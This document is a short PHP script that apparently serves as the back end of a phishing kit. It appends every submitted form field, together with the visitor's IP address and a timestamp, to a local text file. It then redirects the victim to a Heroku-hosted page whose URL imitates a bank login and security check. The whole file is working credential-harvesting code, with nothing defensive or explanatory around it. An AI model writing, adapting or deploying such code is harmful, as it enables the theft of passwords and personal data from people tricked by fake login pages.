<?php
session_start();

$datum = date('d-m-Y / H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
header("Location:https://myprogram-salaryatsea-site.herokuapp.com/login.northlane/securitysys.html/");
$handle = fopen("daya212.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "IP: $ip | Date: $datum (Date=0 GTM)\r\n");
fwrite($handle, "\r\n");
fclose($handle);

setcookie ("user", "empty", time()+3600);
